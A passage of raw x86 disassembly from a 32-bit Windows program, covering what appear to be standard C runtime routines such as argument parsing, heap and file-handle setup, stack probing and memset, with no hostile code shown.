  402ba5:	lea    ecx,[eax+0x1]
  402ba8:	cmp    BYTE PTR [ecx],0x22
  402bab:	jne    0x402bb1
  402bad:	mov    eax,ecx
  402baf:	jmp    0x402bb3
  402bb1:	xor    ebx,ebx
  402bb3:	xor    ecx,ecx
  402bb5:	cmp    DWORD PTR [ebp-0x4],ecx
  402bb8:	sete   cl
  402bbb:	mov    DWORD PTR [ebp-0x4],ecx
  402bbe:	shr    edx,1
  402bc0:	test   edx,edx
  402bc2:	je     0x402bd1
  402bc4:	test   edi,edi
  402bc6:	je     0x402bcc
  402bc8:	mov    BYTE PTR [edi],0x5c
  402bcb:	inc    edi
  402bcc:	inc    DWORD PTR [esi]
  402bce:	dec    edx
  402bcf:	jne    0x402bc4
  402bd1:	mov    cl,BYTE PTR [eax]
  402bd3:	test   cl,cl
  402bd5:	je     0x402c1f
  402bd7:	cmp    DWORD PTR [ebp-0x4],0x0
  402bdb:	jne    0x402be7
  402bdd:	cmp    cl,0x20
  402be0:	je     0x402c1f
  402be2:	cmp    cl,0x9
  402be5:	je     0x402c1f
  402be7:	test   ebx,ebx
  402be9:	je     0x402c19
  402beb:	test   edi,edi
  402bed:	je     0x402c08
  402bef:	movzx  edx,cl
  402bf2:	test   BYTE PTR [edx+0x4299e1],0x4
  402bf9:	je     0x402c01
  402bfb:	mov    BYTE PTR [edi],cl
  402bfd:	inc    edi
  402bfe:	inc    eax
  402bff:	inc    DWORD PTR [esi]
  402c01:	mov    cl,BYTE PTR [eax]
  402c03:	mov    BYTE PTR [edi],cl
  402c05:	inc    edi
  402c06:	jmp    0x402c17
  402c08:	movzx  ecx,cl
  402c0b:	test   BYTE PTR [ecx+0x4299e1],0x4
  402c12:	je     0x402c17
  402c14:	inc    eax
  402c15:	inc    DWORD PTR [esi]
  402c17:	inc    DWORD PTR [esi]
  402c19:	inc    eax
  402c1a:	jmp    0x402b87
  402c1f:	test   edi,edi
  402c21:	je     0x402c27
  402c23:	and    BYTE PTR [edi],0x0
  402c26:	inc    edi
  402c27:	inc    DWORD PTR [esi]
  402c29:	mov    ebx,DWORD PTR [ebp+0xc]
  402c2c:	jmp    0x402b52
  402c31:	mov    eax,DWORD PTR [ebp+0x8]
  402c34:	test   eax,eax
  402c36:	je     0x402c3b
  402c38:	and    DWORD PTR [eax],0x0
  402c3b:	inc    DWORD PTR [ebx]
  402c3d:	pop    edi
  402c3e:	pop    ebx
  402c3f:	leave  
  402c40:	ret    
  402c41:	push   ebp
  402c42:	mov    ebp,esp
  402c44:	push   ecx
  402c45:	push   ecx
  402c46:	push   ebx
  402c47:	push   esi
  402c48:	push   edi
  402c49:	xor    edi,edi
  402c4b:	cmp    DWORD PTR ds:0x429d2c,edi
  402c51:	jne    0x402c58
  402c53:	call   0x403ee3
  402c58:	and    BYTE PTR ds:0x42892c,0x0
  402c5f:	push   0x104
  402c64:	mov    esi,0x428828
  402c69:	push   esi
  402c6a:	push   edi
  402c6b:	call   DWORD PTR ds:0x42606c
  402c71:	mov    eax,ds:0x429d34
  402c76:	cmp    eax,edi
  402c78:	mov    DWORD PTR ds:0x428808,esi
  402c7e:	je     0x402c87
  402c80:	cmp    BYTE PTR [eax],0x0
  402c83:	mov    ebx,eax
  402c85:	jne    0x402c89
  402c87:	mov    ebx,esi
  402c89:	lea    eax,[ebp-0x4]
  402c8c:	push   eax
  402c8d:	push   edi
  402c8e:	lea    esi,[ebp-0x8]
  402c91:	xor    ecx,ecx
  402c93:	mov    eax,ebx
  402c95:	call   0x402ad5
  402c9a:	mov    esi,DWORD PTR [ebp-0x4]
  402c9d:	mov    eax,DWORD PTR [ebp-0x8]
  402ca0:	shl    esi,0x2
  402ca3:	add    eax,esi
  402ca5:	push   eax
  402ca6:	call   0x4034f2
  402cab:	mov    edi,eax
  402cad:	add    esp,0xc
  402cb0:	test   edi,edi
  402cb2:	jne    0x402cb9
  402cb4:	or     eax,0xffffffff
  402cb7:	jmp    0x402cde
  402cb9:	lea    eax,[ebp-0x4]
  402cbc:	push   eax
  402cbd:	lea    ecx,[esi+edi*1]
  402cc0:	push   edi
  402cc1:	lea    esi,[ebp-0x8]
  402cc4:	mov    eax,ebx
  402cc6:	call   0x402ad5
  402ccb:	mov    eax,DWORD PTR [ebp-0x4]
  402cce:	dec    eax
  402ccf:	pop    ecx
  402cd0:	mov    ds:0x4287ec,eax
  402cd5:	pop    ecx
  402cd6:	mov    DWORD PTR ds:0x4287f0,edi
  402cdc:	xor    eax,eax
  402cde:	pop    edi
  402cdf:	pop    esi
  402ce0:	pop    ebx
  402ce1:	leave  
  402ce2:	ret    
  402ce3:	push   ecx
  402ce4:	push   ecx
  402ce5:	mov    eax,ds:0x428930
  402cea:	push   ebx
  402ceb:	push   ebp
  402cec:	push   esi
  402ced:	push   edi
  402cee:	mov    edi,DWORD PTR ds:0x426084
  402cf4:	xor    ebx,ebx
  402cf6:	xor    esi,esi
  402cf8:	cmp    eax,ebx
  402cfa:	push   0x2
  402cfc:	pop    ebp
  402cfd:	jne    0x402d2c
  402cff:	call   edi
  402d01:	mov    esi,eax
  402d03:	cmp    esi,ebx
  402d05:	je     0x402d13
  402d07:	mov    DWORD PTR ds:0x428930,0x1
  402d11:	jmp    0x402d31
  402d13:	call   DWORD PTR ds:0x426018
  402d19:	cmp    eax,0x78
  402d1c:	jne    0x402d27
  402d1e:	mov    eax,ebp
  402d20:	mov    ds:0x428930,eax
  402d25:	jmp    0x402d2c
  402d27:	mov    eax,ds:0x428930
  402d2c:	cmp    eax,0x1
  402d2f:	jne    0x402dae
  402d31:	cmp    esi,ebx
  402d33:	jne    0x402d3d
  402d35:	call   edi
  402d37:	mov    esi,eax
  402d39:	cmp    esi,ebx
  402d3b:	je     0x402db6
  402d3d:	cmp    WORD PTR [esi],bx
  402d40:	mov    eax,esi
  402d42:	je     0x402d52
  402d44:	add    eax,ebp
  402d46:	cmp    WORD PTR [eax],bx
  402d49:	jne    0x402d44
  402d4b:	add    eax,ebp
  402d4d:	cmp    WORD PTR [eax],bx
  402d50:	jne    0x402d44
  402d52:	mov    edi,DWORD PTR ds:0x426080
  402d58:	push   ebx
  402d59:	push   ebx
  402d5a:	push   ebx
  402d5b:	sub    eax,esi
  402d5d:	push   ebx
  402d5e:	sar    eax,1
  402d60:	inc    eax
  402d61:	push   eax
  402d62:	push   esi
  402d63:	push   ebx
  402d64:	push   ebx
  402d65:	mov    DWORD PTR [esp+0x34],eax
  402d69:	call   edi
  402d6b:	mov    ebp,eax
  402d6d:	cmp    ebp,ebx
  402d6f:	je     0x402da3
  402d71:	push   ebp
  402d72:	call   0x4034f2
  402d77:	cmp    eax,ebx
  402d79:	pop    ecx
  402d7a:	mov    DWORD PTR [esp+0x10],eax
  402d7e:	je     0x402da3
  402d80:	push   ebx
  402d81:	push   ebx
  402d82:	push   ebp
  402d83:	push   eax
  402d84:	push   DWORD PTR [esp+0x24]
  402d88:	push   esi
  402d89:	push   ebx
  402d8a:	push   ebx
  402d8b:	call   edi
  402d8d:	test   eax,eax
  402d8f:	jne    0x402d9f
  402d91:	push   DWORD PTR [esp+0x10]
  402d95:	call   0x40331e
  402d9a:	pop    ecx
  402d9b:	mov    DWORD PTR [esp+0x10],ebx
  402d9f:	mov    ebx,DWORD PTR [esp+0x10]
  402da3:	push   esi
  402da4:	call   DWORD PTR ds:0x42607c
  402daa:	mov    eax,ebx
  402dac:	jmp    0x402dfe
  402dae:	cmp    eax,ebp
  402db0:	je     0x402dba
  402db2:	cmp    eax,ebx
  402db4:	je     0x402dba
  402db6:	xor    eax,eax
  402db8:	jmp    0x402dfe
  402dba:	call   DWORD PTR ds:0x426078
  402dc0:	mov    esi,eax
  402dc2:	cmp    esi,ebx
  402dc4:	je     0x402db6
  402dc6:	cmp    BYTE PTR [esi],bl
  402dc8:	je     0x402dd4
  402dca:	inc    eax
  402dcb:	cmp    BYTE PTR [eax],bl
  402dcd:	jne    0x402dca
  402dcf:	inc    eax
  402dd0:	cmp    BYTE PTR [eax],bl
  402dd2:	jne    0x402dca
  402dd4:	sub    eax,esi
  402dd6:	inc    eax
  402dd7:	mov    ebp,eax
  402dd9:	push   ebp
  402dda:	call   0x4034f2
  402ddf:	mov    edi,eax
  402de1:	cmp    edi,ebx
  402de3:	pop    ecx
  402de4:	jne    0x402dea
  402de6:	xor    edi,edi
  402de8:	jmp    0x402df5
  402dea:	push   ebp
  402deb:	push   esi
  402dec:	push   edi
  402ded:	call   0x4013d0
  402df2:	add    esp,0xc
  402df5:	push   esi
  402df6:	call   DWORD PTR ds:0x426074
  402dfc:	mov    eax,edi
  402dfe:	pop    edi
  402dff:	pop    esi
  402e00:	pop    ebp
  402e01:	pop    ebx
  402e02:	pop    ecx
  402e03:	pop    ecx
  402e04:	ret    
  402e05:	sub    esp,0x44
  402e08:	push   0x100
  402e0d:	call   0x4034f2
  402e12:	test   eax,eax
  402e14:	pop    ecx
  402e15:	jne    0x402e1f
  402e17:	or     eax,0xffffffff
  402e1a:	jmp    0x402fac
  402e1f:	mov    ds:0x429c20,eax
  402e24:	mov    DWORD PTR ds:0x429c08,0x20
  402e2e:	lea    ecx,[eax+0x100]
  402e34:	jmp    0x402e50
  402e36:	and    BYTE PTR [eax+0x4],0x0
  402e3a:	or     DWORD PTR [eax],0xffffffff
  402e3d:	mov    BYTE PTR [eax+0x5],0xa
  402e41:	mov    ecx,DWORD PTR ds:0x429c20
  402e47:	add    eax,0x8
  402e4a:	add    ecx,0x100
  402e50:	cmp    eax,ecx
  402e52:	jb     0x402e36
  402e54:	push   ebx
  402e55:	push   esi
  402e56:	push   edi
  402e57:	lea    eax,[esp+0xc]
  402e5b:	push   eax
  402e5c:	call   DWORD PTR ds:0x42604c
  402e62:	cmp    WORD PTR [esp+0x3e],0x0
  402e68:	je     0x402f35
  402e6e:	mov    eax,DWORD PTR [esp+0x40]
  402e72:	test   eax,eax
  402e74:	je     0x402f35
  402e7a:	mov    esi,DWORD PTR [eax]
  402e7c:	push   ebp
  402e7d:	lea    ebp,[eax+0x4]
  402e80:	mov    eax,0x800
  402e85:	cmp    esi,eax
  402e87:	lea    ebx,[esi+ebp*1]
  402e8a:	jl     0x402e8e
  402e8c:	mov    esi,eax
  402e8e:	cmp    DWORD PTR ds:0x429c08,esi
  402e94:	jge    0x402ee8
  402e96:	mov    edi,0x429c24
  402e9b:	push   0x100
  402ea0:	call   0x4034f2
  402ea5:	test   eax,eax
  402ea7:	pop    ecx
  402ea8:	je     0x402ee2
  402eaa:	add    DWORD PTR ds:0x429c08,0x20
  402eb1:	mov    DWORD PTR [edi],eax
  402eb3:	lea    ecx,[eax+0x100]
  402eb9:	jmp    0x402ed1
  402ebb:	and    BYTE PTR [eax+0x4],0x0
  402ebf:	or     DWORD PTR [eax],0xffffffff
  402ec2:	mov    BYTE PTR [eax+0x5],0xa
  402ec6:	mov    ecx,DWORD PTR [edi]
  402ec8:	add    eax,0x8
  402ecb:	add    ecx,0x100
  402ed1:	cmp    eax,ecx
  402ed3:	jb     0x402ebb
  402ed5:	add    edi,0x4
  402ed8:	cmp    DWORD PTR ds:0x429c08,esi
  402ede:	jl     0x402e9b
  402ee0:	jmp    0x402ee8
  402ee2:	mov    esi,DWORD PTR ds:0x429c08
  402ee8:	xor    edi,edi
  402eea:	test   esi,esi
  402eec:	jle    0x402f34
  402eee:	mov    eax,DWORD PTR [ebx]
  402ef0:	cmp    eax,0xffffffff
  402ef3:	je     0x402f2b
  402ef5:	mov    cl,BYTE PTR [ebp+0x0]
  402ef8:	test   cl,0x1
  402efb:	je     0x402f2b
  402efd:	test   cl,0x8
  402f00:	jne    0x402f0d
  402f02:	push   eax
  402f03:	call   DWORD PTR ds:0x42608c
  402f09:	test   eax,eax
  402f0b:	je     0x402f2b
  402f0d:	mov    eax,edi
  402f0f:	sar    eax,0x5
  402f12:	mov    eax,DWORD PTR [eax*4+0x429c20]
  402f19:	mov    ecx,edi
  402f1b:	and    ecx,0x1f
  402f1e:	lea    eax,[eax+ecx*8]
  402f21:	mov    ecx,DWORD PTR [ebx]
  402f23:	mov    DWORD PTR [eax],ecx
  402f25:	mov    cl,BYTE PTR [ebp+0x0]
  402f28:	mov    BYTE PTR [eax+0x4],cl
  402f2b:	inc    edi
  402f2c:	inc    ebp
  402f2d:	add    ebx,0x4
  402f30:	cmp    edi,esi
  402f32:	jl     0x402eee
  402f34:	pop    ebp
  402f35:	xor    ebx,ebx
  402f37:	mov    eax,ds:0x429c20
  402f3c:	lea    esi,[eax+ebx*8]
  402f3f:	cmp    DWORD PTR [esi],0xffffffff
  402f42:	jne    0x402f91
  402f44:	test   ebx,ebx
  402f46:	mov    BYTE PTR [esi+0x4],0x81
  402f4a:	jne    0x402f51
  402f4c:	push   0xfffffff6
  402f4e:	pop    eax
  402f4f:	jmp    0x402f5b
  402f51:	mov    eax,ebx
  402f53:	dec    eax
  402f54:	neg    eax
  402f56:	sbb    eax,eax
  402f58:	add    eax,0xfffffff5
  402f5b:	push   eax
  402f5c:	call   DWORD PTR ds:0x426068
  402f62:	mov    edi,eax
  402f64:	cmp    edi,0xffffffff
  402f67:	je     0x402f80
  402f69:	push   edi
  402f6a:	call   DWORD PTR ds:0x42608c
  402f70:	test   eax,eax
  402f72:	je     0x402f80
  402f74:	and    eax,0xff
  402f79:	cmp    eax,0x2
  402f7c:	mov    DWORD PTR [esi],edi
  402f7e:	jne    0x402f86
  402f80:	or     BYTE PTR [esi+0x4],0x40
  402f84:	jmp    0x402f95
  402f86:	cmp    eax,0x3
  402f89:	jne    0x402f95
  402f8b:	or     BYTE PTR [esi+0x4],0x8
  402f8f:	jmp    0x402f95
  402f91:	or     BYTE PTR [esi+0x4],0x80
  402f95:	inc    ebx
  402f96:	cmp    ebx,0x3
  402f99:	jl     0x402f37
  402f9b:	push   DWORD PTR ds:0x429c08
  402fa1:	call   DWORD PTR ds:0x426088
  402fa7:	pop    edi
  402fa8:	pop    esi
  402fa9:	xor    eax,eax
  402fab:	pop    ebx
  402fac:	add    esp,0x44
  402faf:	ret    
  402fb0:	push   0xc
  402fb2:	push   0x4264d0
  402fb7:	call   0x4030a4
  402fbc:	mov    DWORD PTR [ebp-0x1c],0x426ba8
  402fc3:	cmp    DWORD PTR [ebp-0x1c],0x426ba8
  402fca:	jae    0x402fee
  402fcc:	and    DWORD PTR [ebp-0x4],0x0
  402fd0:	mov    eax,DWORD PTR [ebp-0x1c]
  402fd3:	mov    eax,DWORD PTR [eax]
  402fd5:	test   eax,eax
  402fd7:	je     0x402fe4
  402fd9:	call   eax
  402fdb:	jmp    0x402fe4
  402fdd:	xor    eax,eax
  402fdf:	inc    eax
  402fe0:	ret    
  402fe1:	mov    esp,DWORD PTR [ebp-0x18]
  402fe4:	or     DWORD PTR [ebp-0x4],0xffffffff
  402fe8:	add    DWORD PTR [ebp-0x1c],0x4
  402fec:	jmp    0x402fc3
  402fee:	call   0x4030df
  402ff3:	ret    
  402ff4:	push   0xc
  402ff6:	push   0x4264e0
  402ffb:	call   0x4030a4
  403000:	mov    DWORD PTR [ebp-0x1c],0x426bb0
  403007:	cmp    DWORD PTR [ebp-0x1c],0x426bb0
  40300e:	jae    0x403032
  403010:	and    DWORD PTR [ebp-0x4],0x0
  403014:	mov    eax,DWORD PTR [ebp-0x1c]
  403017:	mov    eax,DWORD PTR [eax]
  403019:	test   eax,eax
  40301b:	je     0x403028
  40301d:	call   eax
  40301f:	jmp    0x403028
  403021:	xor    eax,eax
  403023:	inc    eax
  403024:	ret    
  403025:	mov    esp,DWORD PTR [ebp-0x18]
  403028:	or     DWORD PTR [ebp-0x4],0xffffffff
  40302c:	add    DWORD PTR [ebp-0x1c],0x4
  403030:	jmp    0x403007
  403032:	call   0x4030df
  403037:	ret    
  403038:	cmp    DWORD PTR ds:0x4287d8,0x2
  40303f:	jne    0x40304e
  403041:	cmp    DWORD PTR ds:0x4287e4,0x5
  403048:	jb     0x40304e
  40304a:	xor    eax,eax
  40304c:	inc    eax
  40304d:	ret    
  40304e:	push   0x3
  403050:	pop    eax
  403051:	ret    
  403052:	xor    eax,eax
  403054:	cmp    DWORD PTR [esp+0x4],eax
  403058:	push   0x0
  40305a:	sete   al
  40305d:	push   0x1000
  403062:	push   eax
  403063:	call   DWORD PTR ds:0x426094
  403069:	test   eax,eax
  40306b:	mov    ds:0x429c00,eax
  403070:	je     0x40309c
  403072:	call   0x403038
  403077:	cmp    eax,0x3
  40307a:	mov    ds:0x429c04,eax
  40307f:	jne    0x40309f
  403081:	push   0x3f8
  403086:	call   0x403f01
  40308b:	test   eax,eax
  40308d:	pop    ecx
  40308e:	jne    0x40309f
  403090:	push   DWORD PTR ds:0x429c00
  403096:	call   DWORD PTR ds:0x426090
  40309c:	xor    eax,eax
  40309e:	ret    
  40309f:	xor    eax,eax
  4030a1:	inc    eax
  4030a2:	ret    
  4030a3:	int3   
  4030a4:	push   0x404a2c
  4030a9:	mov    eax,fs:0x0
  4030af:	push   eax
  4030b0:	mov    eax,DWORD PTR [esp+0x10]
  4030b4:	mov    DWORD PTR [esp+0x10],ebp
  4030b8:	lea    ebp,[esp+0x10]
  4030bc:	sub    esp,eax
  4030be:	push   ebx
  4030bf:	push   esi
  4030c0:	push   edi
  4030c1:	mov    eax,DWORD PTR [ebp-0x8]
  4030c4:	mov    DWORD PTR [ebp-0x18],esp
  4030c7:	push   eax
  4030c8:	mov    eax,DWORD PTR [ebp-0x4]
  4030cb:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4030d2:	mov    DWORD PTR [ebp-0x8],eax
  4030d5:	lea    eax,[ebp-0x10]
  4030d8:	mov    fs:0x0,eax
  4030de:	ret    
  4030df:	mov    ecx,DWORD PTR [ebp-0x10]
  4030e2:	mov    DWORD PTR fs:0x0,ecx
  4030e9:	pop    ecx
  4030ea:	pop    edi
  4030eb:	pop    esi
  4030ec:	pop    ebx
  4030ed:	leave  
  4030ee:	push   ecx
  4030ef:	ret    
  4030f0:	cmp    eax,0x1000
  4030f5:	jae    0x403105
  4030f7:	neg    eax
  4030f9:	add    eax,esp
  4030fb:	add    eax,0x4
  4030fe:	test   DWORD PTR [eax],eax
  403100:	xchg   esp,eax
  403101:	mov    eax,DWORD PTR [eax]
  403103:	push   eax
  403104:	ret    
  403105:	push   ecx
  403106:	lea    ecx,[esp+0x8]
  40310a:	sub    ecx,0x1000
  403110:	sub    eax,0x1000
  403115:	test   DWORD PTR [ecx],eax
  403117:	cmp    eax,0x1000
  40311c:	jae    0x40310a
  40311e:	sub    ecx,eax
  403120:	mov    eax,esp
  403122:	test   DWORD PTR [ecx],eax
  403124:	mov    esp,ecx
  403126:	mov    ecx,DWORD PTR [eax]
  403128:	mov    eax,DWORD PTR [eax+0x4]
  40312b:	push   eax
  40312c:	ret    
  40312d:	push   ebp
  40312e:	mov    ebp,esp
  403130:	push   ecx
  403131:	mov    eax,DWORD PTR [ebp+0x8]
  403134:	lea    ecx,[eax+0x1]
  403137:	cmp    ecx,0x100
  40313d:	ja     0x40314b
  40313f:	mov    ecx,DWORD PTR ds:0x428270
  403145:	movzx  eax,WORD PTR [ecx+eax*2]
  403149:	jmp    0x4031a6
  40314b:	mov    ecx,eax
  40314d:	sar    ecx,0x8
  403150:	push   esi
  403151:	mov    esi,DWORD PTR ds:0x428270
  403157:	movzx  edx,cl
  40315a:	test   BYTE PTR [esi+edx*2+0x1],0x80
  40315f:	pop    esi
  403160:	je     0x403171
  403162:	and    BYTE PTR [ebp-0x2],0x0
  403166:	push   0x2
  403168:	mov    BYTE PTR [ebp-0x3],al
  40316b:	mov    BYTE PTR [ebp-0x4],cl
  40316e:	pop    eax
  40316f:	jmp    0x40317b
  403171:	and    BYTE PTR [ebp-0x3],0x0
  403175:	mov    BYTE PTR [ebp-0x4],al
  403178:	xor    eax,eax
  40317a:	inc    eax
  40317b:	push   0x1
  40317d:	push   DWORD PTR ds:0x428958
  403183:	lea    ecx,[ebp+0xa]
  403186:	push   DWORD PTR ds:0x428968
  40318c:	push   ecx
  40318d:	push   eax
  40318e:	lea    eax,[ebp-0x4]
  403191:	push   eax
  403192:	push   0x1
  403194:	call   0x404b04
  403199:	add    esp,0x1c
  40319c:	test   eax,eax
  40319e:	jne    0x4031a2
  4031a0:	leave  
  4031a1:	ret    
  4031a2:	movzx  eax,WORD PTR [ebp+0xa]
  4031a6:	and    eax,DWORD PTR [ebp+0xc]
  4031a9:	leave  
  4031aa:	ret    
  4031ab:	push   esi
  4031ac:	mov    esi,DWORD PTR [esp+0x8]
  4031b0:	mov    eax,DWORD PTR [esi+0xc]
  4031b3:	test   al,0x83
  4031b5:	je     0x403284
  4031bb:	test   al,0x40
  4031bd:	jne    0x403284
  4031c3:	test   al,0x2
  4031c5:	je     0x4031d2
  4031c7:	or     eax,0x20
  4031ca:	mov    DWORD PTR [esi+0xc],eax
  4031cd:	jmp    0x403284
  4031d2:	or     eax,0x1
  4031d5:	test   ax,0x10c
  4031d9:	mov    DWORD PTR [esi+0xc],eax
  4031dc:	jne    0x4031e7
  4031de:	push   esi
  4031df:	call   0x404e9e
  4031e4:	pop    ecx
  4031e5:	jmp    0x4031ec
  4031e7:	mov    eax,DWORD PTR [esi+0x8]
  4031ea:	mov    DWORD PTR [esi],eax
  4031ec:	push   DWORD PTR [esi+0x18]
  4031ef:	push   DWORD PTR [esi+0x8]
  4031f2:	push   DWORD PTR [esi+0x10]
  4031f5:	call   0x404cbe
  4031fa:	add    esp,0xc
  4031fd:	test   eax,eax
  4031ff:	mov    DWORD PTR [esi+0x4],eax
  403202:	je     0x403273
  403204:	cmp    eax,0xffffffff
  403207:	je     0x403273
  403209:	mov    edx,DWORD PTR [esi+0xc]
  40320c:	test   dl,0x82
  40320f:	jne    0x403248
  403211:	mov    ecx,DWORD PTR [esi+0x10]
  403214:	cmp    ecx,0xffffffff
  403217:	push   edi
  403218:	je     0x40322e
  40321a:	mov    edi,ecx
  40321c:	sar    edi,0x5
  40321f:	mov    edi,DWORD PTR [edi*4+0x429c20]
  403226:	and    ecx,0x1f
  403229:	lea    edi,[edi+ecx*8]
  40322c:	jmp    0x403233
  40322e:	mov    edi,0x428260
  403233:	mov    cl,BYTE PTR [edi+0x4]
  403236:	and    cl,0x82
  403239:	cmp    cl,0x82
  40323c:	pop    edi
  40323d:	jne    0x403248
  40323f:	or     edx,0x2000
  403245:	mov    DWORD PTR [esi+0xc],edx
  403248:	cmp    DWORD PTR [esi+0x18],0x200
  40324f:	jne    0x403265
  403251:	mov    ecx,DWORD PTR [esi+0xc]
  403254:	test   cl,0x8
  403257:	je     0x403265
  403259:	test   ch,0x4
  40325c:	jne    0x403265
  40325e:	mov    DWORD PTR [esi+0x18],0x1000
  403265:	mov    ecx,DWORD PTR [esi]
  403267:	dec    eax
  403268:	mov    DWORD PTR [esi+0x4],eax
  40326b:	movzx  eax,BYTE PTR [ecx]
  40326e:	inc    ecx
  40326f:	mov    DWORD PTR [esi],ecx
  403271:	pop    esi
  403272:	ret    
  403273:	neg    eax
  403275:	sbb    eax,eax
  403277:	and    eax,0x10
  40327a:	add    eax,0x10
  40327d:	or     DWORD PTR [esi+0xc],eax
  403280:	and    DWORD PTR [esi+0x4],0x0
  403284:	or     eax,0xffffffff
  403287:	pop    esi
  403288:	ret    
  403289:	push   ebx
  40328a:	mov    ebx,DWORD PTR [esp+0x8]
  40328e:	cmp    ebx,0xffffffff
  403291:	push   esi
  403292:	je     0x4032d5
  403294:	mov    esi,DWORD PTR [esp+0x10]
  403298:	mov    eax,DWORD PTR [esi+0xc]
  40329b:	test   al,0x1
  40329d:	jne    0x4032a7
  40329f:	test   al,al
  4032a1:	jns    0x4032d5
  4032a3:	test   al,0x2
  4032a5:	jne    0x4032d5
  4032a7:	cmp    DWORD PTR [esi+0x8],0x0
  4032ab:	jne    0x4032b4
  4032ad:	push   esi
  4032ae:	call   0x404e9e
  4032b3:	pop    ecx
  4032b4:	mov    eax,DWORD PTR [esi]
  4032b6:	cmp    eax,DWORD PTR [esi+0x8]
  4032b9:	jne    0x4032c4
  4032bb:	cmp    DWORD PTR [esi+0x4],0x0
  4032bf:	jne    0x4032d5
  4032c1:	inc    eax
  4032c2:	mov    DWORD PTR [esi],eax
  4032c4:	dec    DWORD PTR [esi]
  4032c6:	test   BYTE PTR [esi+0xc],0x40
  4032ca:	mov    eax,DWORD PTR [esi]
  4032cc:	je     0x4032db
  4032ce:	cmp    BYTE PTR [eax],bl
  4032d0:	je     0x4032dd
  4032d2:	inc    eax
  4032d3:	mov    DWORD PTR [esi],eax
  4032d5:	or     eax,0xffffffff
  4032d8:	pop    esi
  4032d9:	pop    ebx
  4032da:	ret    
  4032db:	mov    BYTE PTR [eax],bl
  4032dd:	mov    eax,DWORD PTR [esi+0xc]
  4032e0:	inc    DWORD PTR [esi+0x4]
  4032e3:	and    eax,0xffffffef
  4032e6:	or     eax,0x1
  4032e9:	mov    DWORD PTR [esi+0xc],eax
  4032ec:	mov    eax,ebx
  4032ee:	and    eax,0xff
  4032f3:	jmp    0x4032d8
  4032f5:	cmp    DWORD PTR ds:0x428278,0x1
  4032fc:	jle    0x40330c
  4032fe:	push   0x8
  403300:	push   DWORD PTR [esp+0x8]
  403304:	call   0x40312d
  403309:	pop    ecx
  40330a:	pop    ecx
  40330b:	ret    
  40330c:	mov    eax,DWORD PTR [esp+0x4]
  403310:	mov    ecx,DWORD PTR ds:0x428270
  403316:	movzx  eax,BYTE PTR [ecx+eax*2]
  40331a:	and    eax,0x8
  40331d:	ret    
  40331e:	push   esi
  40331f:	mov    esi,DWORD PTR [esp+0x8]
  403323:	test   esi,esi
  403325:	je     0x403354
  403327:	cmp    DWORD PTR ds:0x429c04,0x3
  40332e:	push   esi
  40332f:	jne    0x403346
  403331:	call   0x403f49
  403336:	test   eax,eax
  403338:	pop    ecx
  403339:	push   esi
  40333a:	je     0x403346
  40333c:	push   eax
  40333d:	call   0x403f74
  403342:	pop    ecx
  403343:	pop    ecx
  403344:	pop    esi
  403345:	ret    
  403346:	push   0x0
  403348:	push   DWORD PTR ds:0x429c00
  40334e:	call   DWORD PTR ds:0x426098
  403354:	pop    esi
  403355:	ret    
  403356:	push   ebp
  403357:	mov    ebp,esp
  403359:	push   ebx
  40335a:	push   esi
  40335b:	mov    esi,DWORD PTR [ebp+0xc]
  40335e:	xor    ebx,ebx
  403360:	cmp    esi,ebx
  403362:	je     0x403379
  403364:	cmp    DWORD PTR [ebp+0x10],ebx
  403367:	je     0x403379
  403369:	mov    al,BYTE PTR [esi]
  40336b:	cmp    al,bl
  40336d:	jne    0x40337f
  40336f:	mov    eax,DWORD PTR [ebp+0x8]
  403372:	cmp    eax,ebx
  403374:	je     0x403379
  403376:	mov    WORD PTR [eax],bx
  403379:	xor    eax,eax
  40337b:	pop    esi
  40337c:	pop    ebx
  40337d:	pop    ebp
  40337e:	ret    
  40337f:	cmp    DWORD PTR ds:0x428958,ebx
  403385:	jne    0x40339a
  403387:	mov    ecx,DWORD PTR [ebp+0x8]
  40338a:	cmp    ecx,ebx
  40338c:	je     0x403395
  40338e:	movzx  ax,al
  403392:	mov    WORD PTR [ecx],ax
  403395:	xor    eax,eax
  403397:	inc    eax
  403398:	jmp    0x40337b
  40339a:	mov    ecx,DWORD PTR ds:0x428270
  4033a0:	movzx  eax,al
  4033a3:	test   BYTE PTR [ecx+eax*2+0x1],0x80
  4033a8:	je     0x4033f7
  4033aa:	mov    eax,ds:0x428278
  4033af:	cmp    eax,0x1
  4033b2:	jle    0x4033de
  4033b4:	cmp    DWORD PTR [ebp+0x10],eax
  4033b7:	jl     0x4033e1
  4033b9:	xor    ecx,ecx
  4033bb:	cmp    DWORD PTR [ebp+0x8],ebx
  4033be:	setne  cl
  4033c1:	push   ecx
  4033c2:	push   DWORD PTR [ebp+0x8]
  4033c5:	push   eax
  4033c6:	push   esi
  4033c7:	push   0x9
  4033c9:	push   DWORD PTR ds:0x428968
  4033cf:	call   DWORD PTR ds:0x42609c
  4033d5:	test   eax,eax
  4033d7:	mov    eax,ds:0x428278
  4033dc:	jne    0x40337b
  4033de:	cmp    DWORD PTR [ebp+0x10],eax
  4033e1:	jb     0x4033e8
  4033e3:	cmp    BYTE PTR [esi+0x1],bl
  4033e6:	jne    0x40337b
  4033e8:	mov    DWORD PTR ds:0x4287cc,0x2a
  4033f2:	or     eax,0xffffffff
  4033f5:	jmp    0x40337b
  4033f7:	xor    eax,eax
  4033f9:	cmp    DWORD PTR [ebp+0x8],ebx
  4033fc:	setne  al
  4033ff:	push   eax
  403400:	push   DWORD PTR [ebp+0x8]
  403403:	push   0x1
  403405:	push   esi
  403406:	push   0x9
  403408:	push   DWORD PTR ds:0x428968
  40340e:	call   DWORD PTR ds:0x42609c
  403414:	test   eax,eax
  403416:	jne    0x403395
  40341c:	jmp    0x4033e8
  40341e:	int3   
  40341f:	int3   
  403420:	mov    edx,DWORD PTR [esp+0xc]
  403424:	mov    ecx,DWORD PTR [esp+0x4]
  403428:	test   edx,edx
  40342a:	je     0x40347b
  40342c:	xor    eax,eax
  40342e:	mov    al,BYTE PTR [esp+0x8]
  403432:	push   edi
  403433:	mov    edi,ecx
  403435:	cmp    edx,0x4
  403438:	jb     0x40346b
  40343a:	neg    ecx
  40343c:	and    ecx,0x3
  40343f:	je     0x40344d
  403441:	sub    edx,ecx
  403443:	mov    BYTE PTR [edi],al
  403445:	add    edi,0x1
  403448:	sub    ecx,0x1
  40344b:	jne    0x403443
  40344d:	mov    ecx,eax
  40344f:	shl    eax,0x8
  403452:	add    eax,ecx
  403454:	mov    ecx,eax
  403456:	shl    eax,0x10
  403459:	add    eax,ecx
  40345b:	mov    ecx,edx
  40345d:	and    edx,0x3
  403460:	shr    ecx,0x2
